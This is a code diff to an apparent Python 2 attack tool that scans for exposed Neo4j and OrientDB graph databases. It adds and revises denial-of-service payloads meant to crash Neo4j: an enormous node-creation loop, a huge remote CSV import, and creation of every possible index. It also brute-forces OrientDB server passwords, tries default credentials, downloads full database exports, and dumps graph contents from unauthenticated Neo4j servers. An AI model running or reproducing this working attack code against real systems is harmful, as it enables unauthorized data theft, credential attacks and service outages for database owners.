@@ -8,6 +8,7 @@ import sys
 import json
 import argparse
 import ipaddress
+import os
 
 import socks
 import socket
@@ -39,10 +40,12 @@ def banner():
     """)
 def dos_RamCpu(ip,url_query,headers):
 	print "Send loop to crash Neo4j..."
-	requests.post(url_query,json={'statements': [{'resultDataContents':['row'], 'statement':'FOREACH (x in range(1,10000000000000) | CREATE (:Person {name:"name"+x, age: x%100}));'}]},headers=headers,timeout=30).json()
+	payload_RAM = "{\"statements\":[{\"statement\":\"FOREACH (x in range(1,10000000000000) | CREATE (:Person {name:\"name\"+x, age: x%100}));\",\"parameters\":null,\"resultDataContents\":[\"row\",\"graph\"],\"includeStats\":true}]}"
+	requests.post(url_query,data= payload_RAM,headers=headers,timeout=30).json()
 def dos_disco2(ip,url_query,headers):
 	print "Load huge CSV..."
-	requests.post(url_query,json={'statements': [{'resultDataContents':['row'], 'statement':'USING PERIODIC COMMIT 1000 LOAD CSV FROM \"https://data.cityofchicago.org/api/views/ijzp-q8t2/rows.csv?accessType=DOWNLOAD\" AS row CREATE (A:NODO:NODO2:NODO3:NODO4 {a:row[0],b:row[1],c:row[3],d:row[4]})-[:RE]->(B:NODO5:NODO6:NODO7:NODO8 {zz:row[5],dd:row[6],qq:row[7],rr:row[8]});'}]},headers=headers,timeout=10).json()
+	payload_CSV = "{\"statements\":[{\"statement\":\"USING PERIODIC COMMIT 1000 LOAD CSV FROM \"https://data.cityofchicago.org/api/views/ijzp-q8t2/rows.csv?accessType=DOWNLOAD\" AS row CREATE (A:NODO:NODO2:NODO3:NODO4 {a:row[0],b:row[1],c:row[3],d:row[4]})-[:RE]->(B:NODO5:NODO6:NODO7:NODO8 {zz:row[5],dd:row[6],qq:row[7],rr:row[8]});\",\"parameters\":null,\"resultDataContents\":[\"row\",\"graph\"],\"includeStats\":true}]}"
+	requests.post(url_query,data=payload_CSV,headers=headers,timeout=10).json()
 def dos_disco1(ip,url_query,url_labels,url_props,headers):
 	print "Create all posible indexes"
 	l = []
@@ -52,7 +55,7 @@ def dos_disco1(ip,url_query,url_labels,url_props,headers):
 	for label in labels:
 		for prop in props:
 			g1 ={}
-			g1["statement"] = str("DROP INDEX ON:"+label+"("+prop+");")
+			g1["statement"] = str("CREATE INDEX ON:"+label+"("+prop+");")
 			l.append(g1)
 	g["statements"] = l
 	requests.post(url_query,json=g,headers=headers)
@@ -197,33 +200,37 @@ def analyzeIP_Orient(ip,args):
 	try:
 		url = "http://"+ip+":2480/listDatabases"
 		r = requests.get(url,auth=('neo4j', ''),timeout=1 )
-		if (r.status_code == 200):
-			json_response = r.json()
-			''' Required pass of root to get server information '''			
-			if args.bruteForce == True:
-				p,infoServer = bruteForce_Orient(ip,args.listPassw)
-            			data_report['server_pass'] = p
-				data_report['server_info'] = infoServer.json()
-
-			data_report['databases'] = json_response.get("databases")
-			data_report['version_OrientDB'] = r.headers['Server']
-			databases = json_response.get("databases")
-			for database in databases:		
-				url_database = "http://"+ip+":2480/export/"+database
-				defaultPass=['admin','reader','writer']
-				for dPass in defaultPass:
-					r_data = requests.get(url_database,stream=True,auth=(dPass,dPass),timeout=1)
-					if (r_data.status_code == 200):
-						if not os.path.exists(ip):
-    							os.makedirs(ip)
-						with open(ip+"/"+database+'.gz', 'wb') as out_file:
-							shutil.copyfileobj(r_data.raw, out_file)
-					break;
+		if "orientdb" in r.headers['server'].lower():
 			data_report['ip'] = ip
-			print "Saving report of OrientDB"
-			return data_report
-		else:
-			print "The ip: " + ip + " is a OrientDB but not auth."
+			data_report['version_OrientdB'] = r.headers['server']
+			if (r.status_code == 200):
+				json_response = r.json()
+				''' Required pass of root to get server information '''			
+				if args.bruteForce == True:
+					p,infoServer = bruteForce_Orient(ip,args.listPassw)
+		    			data_report['server_pass'] = p
+					data_report['server_info'] = infoServer.json()
+				data_report['auth'] = False
+				data_report['databases'] = json_response.get("databases")
+				databases = json_response.get("databases")
+				for database in databases:		
+					url_database = "http://"+ip+":2480/export/"+database
+					defaultPass=['admin','reader','writer']
+					for dPass in defaultPass:
+						r_data = requests.get(url_database,stream=True,auth=(dPass,dPass),timeout=1)
+						if (r_data.status_code == 200):
+							if not os.path.exists(ip):
+	    							os.makedirs(ip)
+							with open(ip+"/"+database+'.gz', 'wb') as out_file:
+								shutil.copyfileobj(r_data.raw, out_file)
+						break;
+				data_report['ip'] = ip
+				print "Saving report of OrientDB"
+				
+			else:
+				data_report['auth'] = True
+				print "The ip: " + ip + " is a OrientDB but not auth."
+		return data_report
 
 	except Exception as e:
 		print "The ip: " + ip + " is not a OrientDB graph database."
@@ -266,12 +273,12 @@ def analyzeIP_Neo4j(ip,args):
 	    		data_report['props'] = requests.get(url_props,auth=('neo4j', ''),timeout=1 ).json()			
 					
 			''' Query to get some data of the graph database '''
-			url_query = "http://" + ip + ":7474/db/data/transaction/commit";
+			url_query = "http://" + ip + ":7474/db/data/transaction/commit"
 			if args.limit == False:
-				data_report['info'] = requests.post(url_query,json={'statements': [{'resultDataContents':['row'], 'statement':'MATCH (n)-[r]-(m) RETURN n,r,m LIMIT 20'}]},headers=headers).json()
-				print "recojo info"
+				payload = "{\"statements\":[{\"statement\":\"match (n) return n limit 20\",\"parameters\":null,\"resultDataContents\":[\"row\",\"graph\"],\"includeStats\":true}]}"
 			else:
-				data_report['info'] = requests.post(url_query,json={'statements': [{'resultDataContents':['row'], 'statement':'MATCH (n)-[r]-(m) RETURN n,r,m '}]},headers=headers).json()
+				payload = "{\"statements\":[{\"statement\":\"match (n) return n\",\"parameters\":null,\"resultDataContents\":[\"row\",\"graph\"],\"includeStats\":true}]}"
+			data_report['info'] = requests.post(url_query,data=payload,headers=headers).json()
 				
 			''' Part of a cluster '''
 			url_cluster_avalaible = "http://" + ip + ":7474/db/manage/server/ha/available"
